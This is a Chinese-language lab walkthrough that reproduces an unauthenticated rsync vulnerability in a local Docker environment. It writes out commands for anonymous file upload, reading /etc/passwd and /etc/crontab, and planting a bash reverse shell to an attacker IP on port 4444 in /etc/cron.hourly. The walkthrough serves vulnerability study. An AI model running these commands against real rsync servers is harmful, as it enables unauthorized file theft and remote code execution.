**rsync漏洞复现**

 ** **1.首先要进入我们下载的漏洞环境目录****

![1610027570_5ff71232552f791e93cf8.png!small](https://image.3001.net/images/20210107/1610027570_5ff71232552f791e93cf8.png!small)

 ** **2.编译及运行rsync服务器：****

>  ** **docker-co**** ** **mpose up -d****

![1610027612_5ff7125ce7d6695fecb0b.png!small](https://image.3001.net/images/20210107/1610027612_5ff7125ce7d6695fecb0b.png!small)

 ** **发现拉取成功****

![1610027634_5ff71272d187f167f2ea4.png!small](https://image.3001.net/images/20210107/1610027634_5ff71272d187f167f2ea4.png!small)

 ** **查看地址****

![1610027644_5ff7127cb3266ec1050d6.png!small](https://image.3001.net/images/20210107/1610027644_5ff7127cb3266ec1050d6.png!small)

 ** **3.漏洞复现****

 ** **先查看一下他的模块的文件****

>  ** **rsync rsync://127.0.0.1/src****

![1610027672_5ff712980b252af5c9156.png!small](https://image.3001.net/images/20210107/1610027672_5ff712980b252af5c9156.png!small)

 ** **任意文件上传****

 ** **只需要touch随便创建一个即可****

>  ** **rsync zxc.txt rsync://127.0.0.1/src/home****

 ** **查看上传的文件****

>  ** **rsync rsync://127.0.0.1:873/src/home/zxc.txt****

![1610027704_5ff712b889f005099a6b8.png!small](https://image.3001.net/images/20210107/1610027704_5ff712b889f005099a6b8.png!small)

 ** **任意文件下载****

>  ** **rsync://127.0.0.1/src/etc/passwd****

![1610027729_5ff712d150aabaf96aeec.png!small](https://image.3001.net/images/20210107/1610027729_5ff712d150aabaf96aeec.png!small)

 ** **通过写cron任务反弹shell****

 ** **1、下载任务计划文件****

>  ** **rsync -av rsync://127.0.0.1/src/etc/crontab crontab.txt****

![1610027753_5ff712e9eaeef7df6605d.png!small](https://image.3001.net/images/20210107/1610027753_5ff712e9eaeef7df6605d.png!small)

 ** **任务计划表示在每小时的第17分钟执行run-parts --report /etc/cron.hourly命令****

>  ** **17 * * * * root cd / && run-parts --report /etc/cron.hourly****

 ** **2、构造shell****

![1610027771_5ff712fb61ddef4702e7a.png!small](https://image.3001.net/images/20210107/1610027771_5ff712fb61ddef4702e7a.png!small)

>  ** **#!/bin/bash /bin/bash -i >& /dev/tcp/192.168.0.128/4444 0>&1
> //ip为kali的地址****

![1610027809_5ff713219faef418e59e1.png!small](https://image.3001.net/images/20210107/1610027809_5ff713219faef418e59e1.png!small)

 ** **上传shell****

>  ** **rsync -av shell rsync://127.0.0.1/src/etc/cron.hourly****

![1610027829_5ff713357642450e8e01e.png!small](https://image.3001.net/images/20210107/1610027829_5ff713357642450e8e01e.png!small)

 ** **然后反弹shell，但是需要等17分钟，要不然要修改那个文件****

![1610027841_5ff71341f2bad4b2fd4a3.png!small](https://image.3001.net/images/20210107/1610027841_5ff71341f2bad4b2fd4a3.png!small)

 ** **第二种获取shell的方式****

 ** **docker ps****

![1610027855_5ff7134f3c81b30585561.png!small](https://image.3001.net/images/20210107/1610027855_5ff7134f3c81b30585561.png!small)

>  ** **sudo docker exec -it c1de2543df7b bash****

![1610027879_5ff7136750f632f4d4059.png!small](https://image.3001.net/images/20210107/1610027879_5ff7136750f632f4d4059.png!small)

 ** **发现成功了****

 ** **正好我们在这里修改一下那个执行文件****

 ** **首先要安装vim****

>  ** **apt-get update ##更新****
>
>  ** **apt install vim****

![1610027923_5ff71393846cc4e07a953.png!small](https://image.3001.net/images/20210107/1610027923_5ff71393846cc4e07a953.png!small)

 ** **然后修改成一分钟****

![1610027940_5ff713a439aa7ac407a92.png!small](https://image.3001.net/images/20210107/1610027940_5ff713a439aa7ac407a92.png!small)

 ** **或者第二步骤：****

 ** **直接进入上传shell 那个目录****

>  ** **cd /etc/cron.hourly/****
>
>  ** **./shell****

![1610027964_5ff713bc5185c29faa3ba.png!small](https://image.3001.net/images/20210107/1610027964_5ff713bc5185c29faa3ba.png!small)

 ** **发现反弹成功****

![1610027976_5ff713c803201569d68b2.png!small](https://image.3001.net/images/20210107/1610027976_5ff713c803201569d68b2.png!small)

